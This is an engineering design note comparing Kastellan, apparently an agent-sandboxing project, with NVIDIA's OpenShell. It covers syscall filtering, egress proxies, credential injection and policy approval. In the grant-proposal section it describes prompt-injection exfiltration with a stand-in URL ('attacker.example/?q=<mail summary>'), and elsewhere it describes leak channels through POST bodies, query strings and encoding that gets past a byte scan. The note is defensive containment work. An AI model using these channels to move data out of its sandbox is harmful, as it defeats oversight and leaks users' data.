# Cross-project study: **OpenShell** (NVIDIA)

**Date:** 2026-10-31
**Status:** Investigation and design input. This note changes no code. Its follow-ups are filed as
[#931](https://github.com/hherb/kastellan/issues/931)–[#936](https://github.com/hherb/kastellan/issues/936).
**Question:** How far can NVIDIA OpenShell inform Kastellan? Where is each project the better one,
and what, if anything, should Kastellan learn from OpenShell's approach?

> Source: [`NVIDIA/OpenShell`](https://github.com/NVIDIA/OpenShell) @ `42671c2` (2026-10-31),
> **Apache-2.0**. About 700k lines of Rust across 39 crates, plus Python, TypeScript and Go SDKs.
> Read: the `openshell-sandbox`, `-supervisor*`, `-supervisor-network`, `-binary-identity`,
> `-policy*`, `-prover`, `-server`, `-gateway-interceptors`, `-ocsf`, `-driver-*` and
> `-conformance` crates; `providers/*.yaml`; `docs/how-it-works/`, `docs/security/` and
> `docs/observability/`; RFCs 0001, 0002, 0005, 0009–0012, 0014 and 0018; `TESTING.md`, `CI.md`
> and `AGENTS.md`. Source and docs were read only; the code was not built or run.

**Licence note:** OpenShell is **Apache-2.0**. Apache-2.0 code may enter an AGPL-3.0 tree, provided
its NOTICE is kept, so no borrowing is licence-blocked. Its two notable dependencies, `z3` and
`regorus`, are MIT. Even so, take shapes, not code, and take no dependency on it: the project is
NVIDIA-governed and sends **telemetry by default** (opt-out, `OPENSHELL_TELEMETRY_ENABLED=false`),
which is a mission mismatch independent of code quality.

**Doc-drift warning for anyone re-reading their tree:** `docs/security/best-practices.mdx` still
describes their *previous* design: a netns with a veth pair, a CONNECT proxy at `10.200.0.1` and
`HTTPS_PROXY`. The code has moved to seccomp-notify socket brokering (RFC 0012, implemented while
still in `review`). Trust the code over that page.

---

## 1. The one-paragraph shape of the thing

OpenShell is a **runtime for third-party agents**, not an agent. Claude Code, Codex, OpenCode or
similar lives inside **one long-lived, dev-environment-style sandbox** that it can exec, SSH and
port-forward into. A gRPC **gateway** manages fleets of these sandboxes on Docker, Podman, Kubernetes
or a libkrun micro-VM.

Inside the boundary, `openshell-sandbox` runs as PID 1. It holds no capabilities and runs as the
agent's own UID. It applies:
- Landlock for the filesystem;
- a seccomp `USER_NOTIF` filter that traps `socket`/`connect`/`bind`/`sendto`/`openat`, among others;
- a denylist child filter;
- `SO_BINDTODEVICE=lo` on every socket.

Every outbound connection is held at the syscall. It is checked against a fixed Rego program
(evaluated in-process by `regorus`), with the policy supplied as YAML data, and keyed on the
**connecting binary's SHA-256**. If allowed, it is relayed over mutual-TLS HTTP/2 to a trusted
`openshell-supervisor` *outside* the boundary. The supervisor intercepts TLS with a per-sandbox CA,
enforces L7 rules (REST method and path, GraphQL, MCP tool, JSON-RPC, WebSocket) and **injects
credentials the agent never sees**. Policy changes are reviewed by a Z3 "prover" before a human
approves them.

---

## 2. Where Kastellan is stronger, and must not regress toward them

- **Granularity of the blast radius.** In OpenShell the agent, every tool it uses and every
  credential placeholder it holds share one box. Per-binary network identity is how they tell tools
  apart, and it is weaker than our process-per-tool jail in three ways:
  - **It is trust-on-first-use.** `openshell-binary-identity` pins whatever is at a path the first
    time it is seen.
  - **Interpreted code collapses to its interpreter.** Every Python script is `python3`; their docs
    advise `/usr/bin/python3.*` globs.
  - **The broker that does the measuring runs as the agent's UID.** Its integrity rests on
    `PR_SET_DUMPABLE=0`, seccomp denials of `ptrace`/`process_vm_*`, and Landlock hiding
    `/.openshell`.
- **Fail-closed defaults.** OpenShell ships three fail-open defaults:
  - **L7 `enforcement` defaults to `audit`**: violations are logged and forwarded. Their own words:
    it "does not prevent unauthorized actions".
  - **Landlock defaults to `best_effort`**: a kernel that cannot apply it runs the sandbox "without
    the filesystem rules" and emits a finding.
  - **`proposal_approval_mode: auto`** approves any new public host that carries no credentials
    (see §3.3).
- **seccomp shape.** Ours is an allowlist whose default action is `KillProcess`. Theirs is a
  denylist plus notify-trapping.
- **Semantic oversight.** OpenShell has no analogue of CASSANDRA or the injection guard. Its
  middleware hook (RFC 0009) could host one, and RFC 0009 itself calls inspection of parsed traffic
  "a false sense of coverage". Mechanical policy cannot catch "permitted but contextually wrong".
- **Audit durability.** Our `audit_log` is append-only by grant: `REVOKE UPDATE, DELETE, TRUNCATE`
  from `kastellan_runtime`, in `db/migrations/0002_runtime_role.sql`. Theirs is OCSF JSONL on tmpfs
  or `emptyDir`, with three daily files kept, and is explicitly "not … proof of a complete audit
  history" (`docs/how-it-works/gateways/configuration.mdx`). **Neither project has a hash chain or
  signing.** That gap is shared, and they have nothing to teach on it.
- **Native macOS.** We run on Seatbelt or Apple `container`. They require Docker Desktop, Podman
  machine or libkrun on Hypervisor.framework, all of which are Linux VMs. Fairly stated, the VM route
  gives macOS the *Linux* guarantee and sidesteps the Seatbelt asymmetry. That argues for leaning
  harder on our `MacosContainer` backend, as #286 already proposes, not for copying them.
- **Gate discipline.** Their "a missing variable fails the test; it never skips it" (`TESTING.md`)
  is our REQUIRE knob. They have no analogue of our positive controls or exact
  `ignored`/`filtered out` counts.

---

## 3. What transfers, in order of what it would buy us

### 3.1 HTTP framing on the MITM leg, then L7 method/path rules: [#931](https://github.com/hherb/kastellan/issues/931)

Our proxy authorizes a *destination*. `request_line.rs` parses only `CONNECT host:port`, and
`mitm.rs::intercept` is a **byte relay** (`copy_bidirectional`, or `scan_relay`). It never learns
where one request ends and the next begins. This is the prerequisite for §3.2 as well, and it is the
real cost: a new parser for attacker-controlled bytes. That means strict framing (refuse
CL+TE, duplicate CL, obs-fold, bare CR), **every** pipelined request checked, and HTTP/1.1 only (no
ALPN is configured anywhere today).

Today's payoff is honest but modest. GET-only for `web-fetch`/`web-research` closes the POST-body
exfiltration channel but not the query-string one: it cuts bandwidth, not reach. The real payoff
comes with the first write-capable HTTP tool. This is containment-axis work under CASSANDRA, per the
"two axes" rule. **Enforce is the only mode**, and an L7 rule on a transparent-tunnel worker
(`browser-driver`, `email-in`) must fail at load, never sit there unenforced.

### 3.2 Inject credentials at the sidecar, bound to an endpoint: [#932](https://github.com/hherb/kastellan/issues/932)

OpenShell's best idea. The workload holds a placeholder (`openshell:resolve:env:KEY`). The
supervisor substitutes the real value only when the network policy **and** the credential's own
host/port/path binding both match; otherwise it returns `403 credential_endpoint_mismatch`
(`docs/how-it-works/providers/overview.mdx`).

Here `secret://` is substituted into the worker's params (`core/src/secrets/substitute.rs`), and
exfiltration is caught only by a verbatim-bytes leak scan, which the threat model says encoding
evades. With injection at the sidecar there is nothing in the worker to encode. An endpoint binding
also answers the threat model's open item "bind `secret://` refs to an allowed-tool set at
`materialize`" more strongly than a tool set would. The sidecar knows the plaintext, so it can also
redact an upstream echo in the *response*, which OpenShell does not do.

**Calibrated value today:** the live credential-holding net worker is `mail`. It reads the localmail
bearer token from `KASTELLAN_MAIL_TOKEN_FILE`, outside the vault. Injection makes that token
unstealable but not unusable against localmail, which the allowlist already grants. The value grows
with the first internet-valid API key a worker needs. Depends on §3.1.

### 3.3 A blocked connection becomes an Inbox grant proposal, never auto-approved: [#934](https://github.com/hherb/kastellan/issues/934)

Their RFC 0002 flow turns a denial into a *mechanistic* draft: one binary, one host:port, no model
text. A human approves it, and the rejection reason is fed back to the agent. Approval is admin-only
by RPC annotation, and a test asserts a sandbox principal cannot call it. Our Inbox (#564) already
has the transport, the unforgeable nonce and the closed answer set.

**Do not copy auto-approve.** It treats "new public host, no credentials" as low-risk. Under our
adversary #1, prompt injection, that is precisely the exfiltration endpoint
(`https://attacker.example/?q=<mail summary>`).

**Found while filing:** `tool_allowlists` is read **once**, at registry build at daemon start
(`core/src/registry_build.rs`), and handed to sidecars via env at spawn. So an approved grant, like
a CLI `tools allowlist add` today, does nothing until a restart. A live per-tool reload is the open
design question #934 must settle first.

### 3.4 Classify what a policy change newly permits, with a parity test and no solver: [#933](https://github.com/hherb/kastellan/issues/933)

Their prover (`crates/openshell-prover`) compiles policy globs to Z3 regexes and diffs the baseline
policy against the merged one: `credential_reach_expansion`, `capability_expansion` and so on. **The
delta idea transfers; the solver does not.**
- Our policy space is finite lists, so enumeration is exact and readable.
- `libz3` is a large C++ dependency that would sit in the trusted core.
- Their own soundness list is long: GraphQL, MCP, WebSocket and nested paths are "unsupported",
  credentials are "presence only", and there is a 10 s timeout.

**Copy `tests/runtime_parity.rs` exactly.** The classifier must *call* the proxy's own decision
function and `is_denied_range`, never re-implement them, and a corpus test must assert the two
agree.

### 3.5 Pin worker binaries by install-time digest: [#935](https://github.com/hherb/kastellan/issues/935)

This closes our documented discovery residuals: `InstallDirTrust` is warn-only by default, a
`rename(2)` swap under a group-writable parent works, and the DGX logs the pre-existing 0775 boot
ERROR. Take their *mechanism*, a SHA-256 of the executable checked at use. Reject their *trust
model*: pin at install time, not trust-on-first-use. Keep the manifest out of the install dir, or
whoever can swap a binary can rewrite its digest. Exec the hashed bytes, via bwrap's fd-bind or a
copy into the per-spawn private dir, to close the window between check and swap.

### 3.6 One conformance table across all four backends: [#936](https://github.com/hherb/kastellan/issues/936)

`crates/openshell-conformance` is one driver-agnostic suite that runs before every driver's e2e.
Our parity claim lives instead in per-backend files written separately (`linux_smoke.rs`,
`macos_smoke.rs`, `macos_container_smoke.rs`, the Firecracker e2e tests). Use one table, with each
known divergence an `ExpectedFail { issue }` that must keep failing, and run it under our existing
REQUIRE knobs and positive controls. Carry their RFC 0012 caveat: conformance is "behavioral, not … a
security-strength rating".

---

## 4. Smaller observations, not worth their own entries

- **Connections closed on policy change.** On hot reload they tear down connections opened under the
  old rules. This matters to §3.3's live reload, and for persistent workers (Matrix,
  `persistent_net`), whose sidecars outlive an allowlist edit.
- **Supervisor-loss freeze.** They SIGSTOP the workload if the supervisor vanishes, with a 30 s
  recovery deadline by default. Our sidecar-first, fail-closed spawn plus `--die-with-parent`
  already covers the equivalent.
- **DNS.** They hand out synthetic `198.18.0.0/15` answers and map them back on connect. A worker of
  ours in a private netns has no resolver at all and names the host in its `CONNECT`, and the proxy
  resolves and pins. That is equivalent or better; nothing to take.
- **OCSF event schema** for audit export. Worth knowing about only if SIEM export is ever wanted.
- **Out-of-process extension points.** Gateway interceptors and data-plane middleware run as
  external gRPC services and are deliberately not WASM. RFC 0009 calls WASM "weak for GPU-backed or
  memory-heavy semantic guards". This is consistent with our `kastellan-guard` being a separate
  supervised process.
- **Their unauthenticated Prometheus endpoint**, and extension tokens that "share the gateway's
  signing key … can't rotate or revoke them separately", are admitted gaps. They are not patterns.

---

## 5. What this survey does not change

- The threat-model invariant, process-per-tool, and double containment. OpenShell's one-box model is
  the thing our README's "Why another one?" section argues against.
- The seccomp allowlist posture, and fail-closed as the default everywhere.
- CASSANDRA's place: mechanical L7 rules (§3.1) sit *under* it, never instead of it.
- macOS: no move toward requiring a Linux VM; `MacosContainer` stays opt-in, with #286 as the place
  to argue otherwise.

---

## 6. Follow-ups, in dependency order

1. [#936](https://github.com/hherb/kastellan/issues/936) (conformance table) and
   [#935](https://github.com/hherb/kastellan/issues/935) (binary digests). Both are independent and
   can start now.
2. [#931](https://github.com/hherb/kastellan/issues/931) (HTTP framing plus L7 rules), then
   [#932](https://github.com/hherb/kastellan/issues/932) (credential injection), which needs the
   framing.
3. [#933](https://github.com/hherb/kastellan/issues/933) (delta classifier), then
   [#934](https://github.com/hherb/kastellan/issues/934) (Inbox grant proposals), which refuses to
   offer anything the classifier flags and must first settle the live-reload question.
